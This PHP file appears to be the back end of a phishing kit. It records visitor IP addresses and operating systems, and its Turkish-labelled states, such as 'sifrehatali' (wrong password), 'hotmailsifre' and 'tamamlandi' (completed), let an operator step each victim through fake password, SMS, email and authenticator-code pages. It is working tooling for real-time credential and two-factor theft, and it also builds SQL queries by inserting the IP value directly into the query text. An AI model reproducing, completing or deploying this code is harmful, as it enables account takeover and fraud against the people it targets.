<?php
require_once 'connect.php';

$ip = IP;
$timex = time() + 7;

$db->query("UPDATE records SET lastOnline = '$timex' WHERE ipAddress = '$ip'");

if ($ajax->banControl(IP)) {
    echo json_encode(['name' => 'ban', 'page' => $ban_url]);
    exit;
}

$isIp = $db->prepare("SELECT * FROM ips WHERE ipAddress = ?");
$isIp->execute([$ip]);

if ($isIp->rowCount() > 0) {
    $update = $db->prepare("UPDATE ips SET lastOnline = ?, os = ? WHERE ipAddress = ?");
    $update->execute([$timex, $ajax->get_os_name($useragent), $ip]);
} else {
    $insert = $db->prepare("INSERT INTO ips SET ipAddress = ?, os = ? , lastOnline = ?");
    $insert->execute([$ip, $ajax->get_os_name($useragent), $timex]);
}
$redirect = $db->query("SELECT * FROM redirect WHERE ipAddress = '$ip' ")->fetch(PDO::FETCH_OBJ);
if ($redirect) {
    if ($redirect->page == "basagonder") {
        echo json_encode(["page" => "index"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    } else if ($redirect->page == "sifrehatali") {
        echo json_encode(["page" => "index?error=1"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    } else if ($redirect->page == "telefon") {
        echo json_encode(["page" => "phone-verify"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    } else if ($redirect->page == "mail") {
        echo json_encode(["page" => "email-verify"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    } else if ($redirect->page == "2sms") {
        echo json_encode(["page" => "sms-verify"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    } else if ($redirect->page == "2mail") {
        echo json_encode(["page" => "mail-verify"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    } else if ($redirect->page == "2auth") {
        echo json_encode(["page" => "auth-verify"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }else if ($redirect->page == "smsmail") {
        echo json_encode(["page" => "control?r=1"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }else if ($redirect->page == "smsmailhata") {
        echo json_encode(["page" => "control?r=2"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }else if ($redirect->page == "sms") {
        echo json_encode(["page" => "sms"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }else if ($redirect->page == "smshata") {
        echo json_encode(["page" => "sms?error=true"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }else if ($redirect->page == "mailkod") {
        echo json_encode(["page" => "email"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }else if ($redirect->page == "mailkodhata") {
        echo json_encode(["page" => "email?error=true"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }else if ($redirect->page == "auth") {
        echo json_encode(["page" => "auth"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }else if ($redirect->page == "authhata") {
        echo json_encode(["page" => "auth?error=1"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }else if ($redirect->page == "hotmailsifre") {
        echo json_encode(["page" => "hcontrol"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }else if ($redirect->page == "tamamlandi") {
        echo json_encode(["page" => "complated"]);
        $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
    }
}
exit;